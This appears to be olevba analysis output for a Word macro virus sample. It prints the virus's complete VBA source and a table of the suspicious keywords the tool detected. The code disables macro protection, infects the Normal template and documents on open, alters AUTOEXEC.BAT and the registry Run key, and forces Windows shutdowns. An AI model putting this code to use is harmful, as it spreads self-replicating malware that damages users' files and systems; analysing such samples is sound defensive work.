olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Commander
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Commander - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO systems.bas 
in file: Virus.MSWord.Commander - OLE stream: 'Macros/VBA/systems'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub alex()
On Error Resume Next
Randomize
Dim ad_infect As Boolean, nt_infect As Boolean
ad_infect = False
nt_infect = False
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.ReadOnlyRecommended = False

With NormalTemplate.VBProject.VBComponents
 If .Item(1).CodeModule.CountOfLines <> 0 Then
  .Item(1).CodeModule.DeleteLines 1, _
  .Item(1).CodeModule.CountOfLines
 End If
End With

With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Zero"
    .Subject = "My virus"
    .Comments = "Remember me"
    .Execute
End With

With NormalTemplate.VBProject.VBComponents
 For i = 1 To .Count
  If .Item(i).Name = "systems" Then nt_infect = True
 Next i
End With

With ActiveDocument.VBProject.VBComponents
 For i = 1 To .Count
  If .Item(i).Name = "systems" Then ad_infect = True
 Next i
End With

If ad_infect = False Then
   NormalTemplate.VBProject.VBComponents("systems").Export "c:\msdoc.sys"
   ActiveDocument.VBProject.VBComponents.import "c:\msdoc.sys"
   Kill "c:\msdoc.sys"
   End If

If nt_infect = False Then
   ActiveDocument.VBProject.VBComponents("systems").Export "c:\msdoc.sys"
   NormalTemplate.VBProject.VBComponents.import "c:\msdoc.sys"
   Kill "c:\msdoc.sys"
End If

If ad_infect = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If nt_infect = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
If Year(Now) > 2001 Then
 If (Day(Now)) Mod 7 = 0 Then Call joke
 If (Day(Now)) = 4 And Month(Now) = 4 Then Call reboot
End If
End Sub
Sub FileSave()
    On Error Resume Next
    If (Day(Now)) Mod 7 = 0 Then Call joke
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "Hi, guys!", vbInformation
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call alex
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call reboot
End Sub
Sub ViewVBCode()
    On Error Resume Next
    If Day(Now) = 13 Or Day(Now) > 28 Then Call reboot
    ActiveDocument.Save
    Shell "rundll.exe user,exitwindows"
End Sub
Sub joke()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "командир"
            .Replacement.Text = "мудила"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Sub reboot()
Dim f As Integer, c As String, w(30) As String, i As Integer
Dim fil As String
fil = Dir("c:\AUTOEXEC.BAT")
If fil <> "AUTOEXEC.BAT" Then GoTo exits
Open "c:\AUTOEXEC.BAT" For Input As #1
Input #1, c
Input #1, c
If c = "c:\Msdos.com" Then Close #1: GoTo exitt
Close #1
Open "c:\AUTOEXEC.BAT" For Input As #1
f = 1
While EOF(1) = False
Input #1, w(f)
f = f + 1
Wend
Close #1
Open "c:\AUTOEXEC.BAT" For Output As #1
Seek #1, 1
Print #1, "@echo off"
Print #1, "c:\Msdos.com"
For i = 1 To f - 1
Print #1, w(i)
Next i
Close #1
exitt:
  Dim a As Integer, b As Integer, h As Long
   a = 234: b = 0: h = 65535
   Open "c:\msdos.com" For Binary As #1
   Seek #1, 1
   Put #1, 1, a
    Put #1, 2, b
    Put #1, 4, h
  Close #1
exits:
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\windows\currentversion\run", "SystemTrays") = "rundll.exe user,exitwindows"
Shell "rundll.exe user,exitwindows"
End Sub






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |rundll.exe          |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

